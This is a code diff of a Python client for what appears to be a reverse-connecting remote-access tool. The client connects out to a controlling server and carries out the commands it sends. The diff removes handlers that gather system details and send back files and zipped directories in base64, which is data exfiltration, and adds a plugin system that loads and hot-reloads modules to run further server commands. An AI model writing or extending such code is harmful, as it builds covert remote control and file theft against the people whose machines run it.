@@ -5,53 +5,36 @@ import socket
 import subprocess
 from os import execv
 from os.path import expanduser, realpath
-from base64 import b64decode, b64encode
+from base64 import b64decode
 from time import sleep
-import zipfile, zlib
 import shlex
-import platform
+from importlib import reload
 
 
-def get_sys_info():
-    info = """
-Machine: {}\nVersion: {}
-Platform: {}\nNode: {}\nUname: {}\nSystem: {}
-Processor: {}\n\nHost Name: {}\nFQDN: {}\n
-""".format(
-        platform.machine(),
-        platform.version(),
-        platform.platform(),
-        platform.node(),
-        platform.uname(),
-        platform.system(),
-        platform.processor(),
-        socket.gethostname(),
-        socket.getfqdn()
-    )
-    return info
-
-
-def zipdir(path, ziph):
+def get_plugins():
     """
-    Zip an entire folder.
-
-    :param path:
-    :param ziph:
+    Dynamically import any plugins in the `plugins` package.
     :return:
     """
 
-    # ziph is zipfile handle
-    for root, dirs, files in os.walk(path):
-        for file in files:
-            ziph.write(os.path.join(root, file), os.path.relpath(os.path.join(root, file), os.path.join(path, '..')))
+    plugin_list = []
+    fp = __file__.replace(__file__.split('/')[-1], '') + 'plugins'
+    module_names = [n.replace('.py', '').replace('.pyc', '') for n in os.listdir(fp) if '__init__.py' not in n]
+
+    for module_name in module_names:
+        plugin = __import__('plugins.' + module_name, fromlist=[''])
+        plugin_list.append(plugin)
+
+    return plugin_list
 
 
 class Client(object):
-    def __init__(self, host='', port=6667, recv_size=1024, server_shutdown=False, session_id='', shutdown_kill=False):
+    def __init__(self, host='', port=6667, recv_size=1024, server_shutdown=False, session_id='', shutdown_kill=False, reload_plugins=True):
         self.host = host
         self.port = port
         self.recv_size = recv_size
         self.server_shutdown = server_shutdown
+        self.reload_plugins = reload_plugins
         self.shutdown_kill = shutdown_kill
         self.session_id = session_id
         self.reconnect_to_session = True
@@ -282,6 +265,7 @@ class Client(object):
 
         :return:
         """
+        plugin_list = get_plugins()
 
         # If we have a socket, then proceed to receive commands.
         if self.sock:
@@ -373,39 +357,25 @@ class Client(object):
                         sleep(1)
                         continue
 
-                    # Handle system information requests
-                    if data == 'sysinfo':
-                        self.send_data(get_sys_info())
-                        continue
+                    # # # # # # # PROCESS PLUGINS # # # # # # #
+                    if plugin_list:
+                        plugin_ran = False
+                        for _plugin in plugin_list:
+                            if self.reload_plugins:
+                                reload(_plugin)
+                            plugin = _plugin.Plugin()
 
-                    # Handle a get command sent from server.
-                    # Send the file data back.
-                    if data[:4] == 'get ':
-                        try:
-                            fp = data[4:].strip()
-                            with open(expanduser(fp), 'rb') as f:
-                                _ = b64encode(f.read())
-                                self.send_data(_, encode=False, terminate=False, echo=False)
-                                del _
-                                f.close()
+                            invocation_length = len(plugin.invocation)
 
-                        except FileNotFoundError as err_msg:
-                            self.send_data(str(err_msg), terminate=False)
-                        except IsADirectoryError as err_msg:
-                            # Zip up the directory and send it over.
-                            zf = zipfile.ZipFile(expanduser(fp) + '.zip', 'w', zipfile.ZIP_DEFLATED)
-                            zipdir(expanduser(fp), zf)
-                            zf.close()
-                            with open(expanduser(fp + '.zip'), 'rb') as f:
-                                _ = b64encode(f.read())
-                                self.send_data(_, encode=False, terminate=False, echo=False)
-                                del _
-                                f.close()
-                                os.remove(expanduser(fp + '.zip'))
+                            # Check the data for the plugins command invocation
+                            if data[:invocation_length] == plugin.invocation:
+                                print('Running Plugin...')
+                                plugin.run(self, data[invocation_length:])
+                                plugin_ran = True
+                                break
 
-                        self.terminate()
-                        del fp
-                        continue
+                        if plugin_ran:
+                            continue
 
                     # Handle setting the file upload name.
                     if data[:16] == 'upload_filepath ':
@@ -499,6 +469,7 @@ if __name__ == '__main__':
     the_recv_size = 1024
     the_server_shutdown = False
     the_session_id = ''
+    the_reload_plugins = True
 
     def check_cli_arg(arg):
         global the_host
@@ -506,6 +477,7 @@ if __name__ == '__main__':
         global the_recv_size
         global the_server_shutdown
         global the_session_id
+        global the_reload_plugins
 
         if 'host=' in arg:
             the_host = arg.split('=')[1]
@@ -517,6 +489,9 @@ if __name__ == '__main__':
             the_server_shutdown = True if arg.split('=')[1].upper() == 'Y' else False
         elif 'session_id=' in arg:
             the_session_id = arg.split('=')[1].strip()
+        elif 'reload_plugins=' in arg:
+            the_reload_plugins = True if arg.split('=')[1].upper().strip() == 'Y' else False
+
 
     restart_command = list(sys.argv)
 
@@ -529,7 +504,8 @@ if __name__ == '__main__':
         port=the_port,
         recv_size=the_recv_size,
         server_shutdown=the_server_shutdown,
-        session_id=the_session_id
+        session_id=the_session_id,
+        reload_plugins=the_reload_plugins
     )
     client.main()
 
